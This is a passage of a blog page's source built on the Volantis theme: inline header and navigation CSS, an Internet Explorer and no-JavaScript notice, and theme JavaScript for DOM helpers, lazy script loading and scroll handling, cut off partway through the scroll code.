  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (min-width: 2048px) {
  .l_header #wrapper .nav-sub {
    max-width: 55vw;
    margin: auto;
  }
}
.l_header #wrapper.sub .nav-sub {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
}
.l_header #wrapper .title {
  position: relative;
  color: var(--color-text);
  padding-left: 24px;
  max-height: 64px;
}
.l_header #wrapper .nav-main .title {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-shrink: 0;
  line-height: 64px;
  padding: 0 24px;
  font-size: 1.25rem;
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
}
.l_header #wrapper .nav-main .title img {
  height: 64px;
}
.l_header .nav-sub {
  max-width: 1280px;
  margin: auto;
}
.l_header .nav-sub .title {
  font-weight: bold;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  line-height: 1.2;
  max-height: 64px;
  white-space: normal;
  flex-shrink: 1;
}
.l_header .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  line-height: 64px;
  align-items: center;
}
.l_header .switcher .s-toc {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (max-width: 768px) {
  .l_header .switcher .s-toc {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
  }
}
.l_header .switcher >li {
  height: 48px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  margin: 2px;
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li {
    margin: 0 1px;
    height: 48px;
  }
}
.l_header .switcher >li >a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  align-items: center;
  width: 48px;
  height: 48px;
  padding: 0.85em 1.1em;
  border-radius: 100px;
  -webkit-border-radius: 100px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  color: #3dd9b6;
}
.l_header .switcher >li >a:hover {
  border: none;
}
.l_header .switcher >li >a.active,
.l_header .switcher >li >a:active {
  border: none;
  background: var(--color-site-bg);
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li >a {
    width: 36px;
    height: 48px;
  }
}
.l_header .nav-sub .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
}
.l_header .m_search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  height: 64px;
  width: 240px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (max-width: 1024px) {
  .l_header .m_search {
    width: 44px;
    min-width: 44px;
  }
  .l_header .m_search input::placeholder {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
  }
  .l_header .m_search:hover {
    width: 240px;
  }
  .l_header .m_search:hover input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (min-width: 500px) {
  .l_header .m_search:hover .input {
    width: 100%;
  }
  .l_header .m_search:hover .input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search {
    min-width: 0;
  }
  .l_header .m_search input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.l_header .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  width: 100%;
  align-items: center;
}
.l_header .m_search .icon {
  position: absolute;
  width: 36px;
  left: 5px;
  color: var(--color-meta);
}
@media screen and (max-width: 500px) {
  .l_header .m_search .icon {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
.l_header .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding-top: 8px;
  padding-bottom: 8px;
  line-height: 1.3;
  width: 100%;
  color: var(--color-text);
  background: #fafafa;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  padding-left: 40px;
  font-size: 0.875rem;
  border-radius: 8px;
  -webkit-border-radius: 8px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (min-width: 500px) {
  .l_header .m_search .input:focus {
    box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
    -webkit-box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search .input {
    background: var(--color-block);
    padding-left: 8px;
    border: none;
  }
  .l_header .m_search .input:hover,
  .l_header .m_search .input:focus {
    border: none;
  }
}
@media (max-width: 500px) {
  .l_header .m_search {
    left: 0;
    width: 0;
    overflow: hidden;
    position: absolute;
    background: #fff;
    transition: all 0.28s ease;
    -webkit-transition: all 0.28s ease;
    -khtml-transition: all 0.28s ease;
    -moz-transition: all 0.28s ease;
    -o-transition: all 0.28s ease;
    -ms-transition: all 0.28s ease;
  }
  .l_header .m_search .input {
    border-radius: 32px;
    -webkit-border-radius: 32px;
    margin-left: 16px;
    padding-left: 16px;
  }
  .l_header.z_search-open .m_search {
    width: 100%;
  }
  .l_header.z_search-open .m_search .input {
    width: calc(100% - 120px);
  }
}
ul.m-pc >li>a {
  color: inherit;
  border-bottom: 2px solid transparent;
}
ul.m-pc >li>a:active,
ul.m-pc >li>a.active {
  border-bottom: 2px solid #3dd9b6;
}
ul.m-pc li:hover >ul.list-v,
ul.list-v li:hover >ul.list-v {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.nav-list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  align-items: stretch;
}
ul.nav-list-h>li {
  position: relative;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  height: 100%;
  line-height: 2.4;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
ul.nav-list-h>li >a {
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-weight: 600;
}
ul.list-v {
  z-index: 1;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: absolute;
  background: var(--color-card);
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  margin-top: -6px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  padding: 8px 0;
}
ul.list-v.show {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.list-v hr {
  margin-top: 8px;
  margin-bottom: 8px;
}
ul.list-v >li {
  white-space: nowrap;
  word-break: keep-all;
}
ul.list-v >li.header {
  font-size: 0.78125rem;
  font-weight: bold;
  line-height: 2em;
  color: var(--color-meta);
  margin: 8px 16px 4px;
}
ul.list-v >li.header i {
  margin-right: 8px;
}
ul.list-v >li ul {
  margin-left: 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: -40px;
}
ul.list-v .aplayer-container {
  min-height: 64px;
  padding: 6px 16px;
}
ul.list-v >li>a {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  color: var(--color-list);
  font-size: 0.875rem;
  font-weight: bold;
  line-height: 36px;
  padding: 0 20px 0 16px;
  text-overflow: ellipsis;
  margin: 0 4px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
@media screen and (max-width: 1024px) {
  ul.list-v >li>a {
    line-height: 40px;
  }
}
ul.list-v >li>a >i {
  margin-right: 8px;
}
ul.list-v >li>a:active,
ul.list-v >li>a.active {
  color: var(--color-list-hl);
}
ul.list-v >li>a:hover {
  color: var(--color-list-hl);
  background: var(--color-site-bg);
}
.l_header .menu >ul>li>a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding: 0 8px;
}
.l_header .menu >ul>li>a >i {
  margin-right: 4px;
}
.l_header ul.nav-list-h>li {
  color: var(--color-list);
  line-height: 64px;
}
.l_header ul.nav-list-h>li >a {
  max-height: 64px;
  overflow: hidden;
  color: inherit;
}
.l_header ul.nav-list-h>li >a:active,
.l_header ul.nav-list-h>li >a.active {
  color: #3dd9b6;
}
.l_header ul.nav-list-h>li:hover>a {
  color: var(--color-list-hl);
}
.l_header ul.nav-list-h>li i.music {
  animation: rotate-effect 1.5s linear infinite;
  -webkit-animation: rotate-effect 1.5s linear infinite;
  -khtml-animation: rotate-effect 1.5s linear infinite;
  -moz-animation: rotate-effect 1.5s linear infinite;
  -o-animation: rotate-effect 1.5s linear infinite;
  -ms-animation: rotate-effect 1.5s linear infinite;
}
@-moz-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-webkit-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-o-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
.menu-phone li ul.list-v {
  right: calc(100% - 0.5 * 16px);
}
.menu-phone li ul.list-v ul {
  right: calc(100% - 0.5 * 16px);
}
#wrapper {
  max-width: 1280px;
  margin: auto;
}
@media screen and (min-width: 2048px) {
  #wrapper {
    max-width: 55vw;
  }
}
#wrapper .menu {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 1;
  -ms-flex: 1 1;
  flex: 1 1;
  margin: 0 16px 0 0;
}
#wrapper .menu .list-v ul {
  left: calc(100% - 0.5 * 16px);
}
.menu-phone {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: 16px;
  right: 8px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.menu-phone ul {
  right: calc(100% - 0.5 * 16px);
}
@media screen and (max-width: 500px) {
  .menu-phone {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: block;
  }
}
.l_header {
  max-width: 65vw;
  left: calc((100% - 65vw) * 0.5);
  border-bottom-left-radius: 8px;
  border-bottom-right-radius: 8px;
}
@media screen and (max-width: 2048px) {
  .l_header {
    max-width: 1312px;
    left: calc((100% - 1312px) * 0.5);
  }
}
@media screen and (max-width: 1312px) {
  .l_header {
    left: 0;
    border-radius: 0;
    -webkit-border-radius: 0;
    max-width: 100%;
  }
}
@media screen and (max-width: 500px) {
  .l_header .container {
    margin-left: 0;
    margin-right: 0;
  }
  .l_header #wrapper .nav-main .title {
    padding-left: 16px;
    padding-right: 16px;
  }
  .l_header #wrapper .nav-sub {
    width: 100%;
  }
  .l_header #wrapper .nav-sub .title {
    overflow-y: scroll;
    margin-top: 2px;
    padding: 8px 16px;
  }
  .l_header #wrapper .switcher {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
    margin-right: 8px;
  }
  .l_header .menu {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
@media screen and (max-width: 500px) {
  .list-v li {
    max-width: 270px;
  }
}
#u-search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  padding: 60px 20px;
  z-index: 1001;
}
@media screen and (max-width: 680px) {
  #u-search {
    padding: 0px;
  }
}
@media screen and (prefers-color-scheme: dark) and (max-width: 500px) {
  .l_header .m_search {
    background: var(--color-site-bg) !important;
  }
}

  </style>
  <link rel="stylesheet" href="/en/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/en/css/style.css"></noscript>
    <script>
      let userColorScheme=localStorage.getItem("color-scheme")
      if(userColorScheme){
        document.documentElement.setAttribute("color-scheme", userColorScheme);
      }
    </script>
  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
    '.kill-t{'+
      'font-size: 2rem;'+
    '}'+
    '.kill-c{'+
      'font-size: 1.2rem;'+
    '}'+
		'#l_header,#l_body{'+
			'display: none;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        `<span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>`+
        `<span class="kill-c">Microsoft has terminated support for Internet Explorer (IE) 10 and earlier versions in 2016. <br/>There are great security risks to continue using it. Please use contemporary mainstream browsers to access.</span><br/>`+
        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>Learn more ></strong></a>`+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
    .kill-t{
      font-size: 2rem;
    }
    .kill-c{
      font-size: 1.2rem;
    }
		#l_header,#l_body{
			display: none;
		}
	</style>
    <div class="kill-noscript">
        <span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>
        <span class="kill-c">This page requires browser support (enable) JavaScript</span><br/>
        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>Learn more ></strong></a>
    </div>
</noscript>


  <script>
  /************这个文件存放不需要重载的全局变量和全局函数*********/
  window.volantis = {}; // volantis 全局变量
  volantis.debug = "env"; // 调试模式
  volantis.dom = {}; // 页面Dom see: /source/js/app.js etc.
  /******************** volantis.dom.$ ********************************/
  // 注：这里没有选择器，也没有forEach一次只处理一个dom，这里重新封装主题常用的dom方法，返回的是dom对象，对象包含了以下方法，同时保留dom的原生API
  function volantisDom(ele) {
    if (!ele) ele = document.createElement("div")
    this.ele = ele;
    // ==============================================================
    this.ele.find = (c) => {
      let q = this.ele.querySelector(c)
      if (q)
        return new volantisDom(q)
    }
    // ==============================================================
    this.ele.hasClass = (c) => {
      return this.ele.className.match(new RegExp('(\\s|^)' + c + '(\\s|$)'));
    }
    this.ele.addClass = (c) => {
      this.ele.classList.add(c);
      return this.ele
    }
    this.ele.removeClass = (c) => {
      this.ele.classList.remove(c);
      return this.ele
    }
    this.ele.toggleClass = (c) => {
      if (this.ele.hasClass(c)) {
        this.ele.removeClass(c)
      } else {
        this.ele.addClass(c)
      }
      return this.ele
    }
    // ==============================================================
    this.ele.on = (c, f) => {
      this.ele.addEventListener(c, f, false)
      return this.ele
    }
    this.ele.click = (f, r) => {
      this.ele.on("click", f, r)
      return this.ele
    }
    this.ele.scroll = (f, r) => {
      this.ele.on("scroll", f, r)
      return this.ele
    }
    // ==============================================================
    this.ele.html = (c) => {
      // if(c=== undefined){
      //   return this.ele.innerHTML
      // }else{
      this.ele.innerHTML = c
      return this.ele
      // }
    }
    // ==============================================================
    this.ele.hide = (c) => {
      this.ele.style.display = "none"
      return this.ele
    }
    this.ele.show = (c) => {
      this.ele.style.display = "block"
      return this.ele
    }
    // ==============================================================
    return this.ele
  }
  volantis.dom.$ = (ele) => {
    return !!ele ? new volantisDom(ele) : null;
  }
  /******************** RunItem ********************************/
  function RunItem() {
    this.list = []; // 存放回调函数
    this.start = () => {
      for (var i = 0; i < this.list.length; i++) {
        this.list[i].run();
      }
    };
    this.push = (fn, name, setRequestAnimationFrame = true) => {
      let myfn = fn
      if (setRequestAnimationFrame) {
        myfn = () => {
          volantis.requestAnimationFrame(fn)
        }
      }
      var f = new Item(myfn, name);
      this.list.push(f);
    };
    this.remove = (name) => {
      for (let index = 0; index < this.list.length; index++) {
        const e = this.list[index];
        if (e.name == name) {
          this.list.splice(index, 1);
        }
      }
    }
    // 构造一个可以run的对象
    function Item(fn, name) {
      // 函数名称
      this.name = name || fn.name;
      // run方法
      this.run = () => {
        try {
          fn()
        } catch (error) {
          console.log(error);
        }
      };
    }
  }
  /******************** RightMenu ********************************/
  // volantis.rightmenu.handle(callBack[,"callBackName"]) 外部菜单项控制
  // 可在 volantis.mouseEvent 处获取右键事件
  volantis.rightmenu = {};
  volantis.rightmenu.method = {
    handle: new RunItem(),
  }
  volantis.rightmenu = Object.assign(volantis.rightmenu, {
    handle: volantis.rightmenu.method.handle.push,
  });
  /********************  Dark Mode  ********************************/
  // /layout/_partial/scripts/darkmode.ejs
  // volantis.dark.mode 当前模式 dark or light
  // volantis.dark.toggle() 暗黑模式触发器
  // volantis.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
  volantis.dark = {};
  volantis.dark.method = {
    toggle: new RunItem(),
  };
  volantis.dark = Object.assign(volantis.dark, {
    push: volantis.dark.method.toggle.push,
  });
  /********************  Message  ********************************/
  // VolantisApp.message
  /********************  isMobile  ********************************/
  // /source/js/app.js
  // volantis.isMobile
  // volantis.isMobileOld
  /********************脚本动态加载函数********************************/
  // volantis.js(src, cb)  cb 可以传入onload回调函数 或者 JSON对象 例如: volantis.js("src", ()=>{}) 或 volantis.js("src", {defer:true,onload:()=>{}})
  // volantis.css(src)

  // 返回Promise对象，如下方法同步加载资源，这利于处理文件资源之间的依赖关系，例如：APlayer 需要在 MetingJS 之前加载
  // (async () => {
  //     await volantis.js("...theme.plugins.aplayer.js.aplayer...")
  //     await volantis.js("...theme.plugins.aplayer.js.meting...")
  // })();

  // 已经加入了setTimeout
  volantis.js = (src, cb) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        if (cb) {
          if (JSON.stringify(cb)) {
            for (let p in cb) {
              if (p == "onload") {
                script[p] = () => {
                  cb[p]()
                  resolve()
                }
              } else {
                script[p] = cb[p]
                script.onload = resolve
              }
            }
          } else {
            script.onload = () => {
              cb()
              resolve()
            };
          }
        } else {
          script.onload = resolve
        }
        script.setAttribute("src", src);
        HEAD.appendChild(script);
      });
    });
  }
  volantis.css = (src) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var link = document.createElement('link');
        link.rel = "stylesheet";
        link.href = src;
        link.onload = resolve;
        document.getElementsByTagName("head")[0].appendChild(link);
      });
    });
  }
  /********************按需加载的插件********************************/
  // volantis.import.jQuery().then(()=>{})
  volantis.import = {
    jQuery: () => {
      if (typeof jQuery == "undefined") {
        return volantis.js("https://unpkg.com/jquery@3.7.1/dist/jquery.min.js")
      } else {
        return new Promise(resolve => {
          resolve()
        });
      }
    }
  }
  /********************** requestAnimationFrame ********************************/
  // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
  // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
  volantis.requestAnimationFrame = (fn) => {
    if (!window.requestAnimationFrame) {
      window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
    }
    window.requestAnimationFrame(fn)
  }
  /************************ layoutHelper *****************************************/
  volantis.layoutHelper = (helper, html, opt) => {
    opt = Object.assign({ clean: false}, opt)
    function myhelper(helper, html, clean) {
      volantis.tempDiv = document.createElement("div");
      volantis.tempDiv.innerHTML = html;
      let layoutHelper = document.querySelector("#layoutHelper-" + helper)
      if (layoutHelper) {
        if (clean) {
          layoutHelper.innerHTML = ""
        }
        layoutHelper.append(volantis.tempDiv);
      }
    }
    myhelper(helper, html, opt.clean)
  }
  /****************************** 滚动事件处理 ****************************************/
  volantis.scroll = {
    engine: new RunItem(),
    unengine: new RunItem(),
  };
  volantis.scroll = Object.assign(volantis.scroll, {
    push: volantis.scroll.engine.push,
  });
  // 滚动条距离顶部的距离
  volantis.scroll.getScrollTop = () => {
    let scrollPos;
    if (window.pageYOffset) {
      scrollPos = window.pageYOffset;
    } else if (document.compatMode && document.compatMode != 'BackCompat') {
      scrollPos = document.documentElement.scrollTop;
    } else if (document.body) {
      scrollPos = document.body.scrollTop;
    }
    return scrollPos;
  }
  volantis.scroll.scrollHeight = function () {
    return Math.max(
      document.body.scrollHeight,
      document.documentElement.scrollHeight,
    )
  }
  volantis.scroll.offsetHeight = function () {
    return Math.max(
      document.body.offsetHeight,
      document.documentElement.offsetHeight,
      document.body.clientHeight,
      document.documentElement.clientHeight
    )
  }
  volantis.scroll.progress = function () {
    return volantis.scroll.getScrollTop() / (volantis.scroll.scrollHeight() - volantis.scroll.offsetHeight())
  }
  // 使用 requestAnimationFrame 处理滚动事件
  // `volantis.scroll.del` 中存储了一个数值, 该数值检测一定时间间隔内滚动条滚动的位移, 数值的检测频率是浏览器的刷新频率. 数值为正数时, 表示向下滚动. 数值为负数时, 表示向上滚动.
  volantis.scroll.handleScrollEvents = () => {
    volantis.scroll.lastScrollTop = volantis.scroll.getScrollTop()
    function loop() {
      const scrollTop = volantis.scroll.getScrollTop();
      if (volantis.scroll.lastScrollTop !== scrollTop) {
        volantis.scroll.del = scrollTop - volantis.scroll.lastScrollTop;
        volantis.scroll.lastScrollTop = scrollTop;
        // if (volantis.scroll.del > 0) {
        //   console.log("向下滚动");
        // } else {
        //   console.log("向上滚动");
        // }
        // 注销过期的unengine未滚动事件
        volantis.scroll.unengine.list = []
        volantis.scroll.engine.start();
      } else {
        volantis.scroll.unengine.start();
      }
      volantis.requestAnimationFrame(loop)
    }
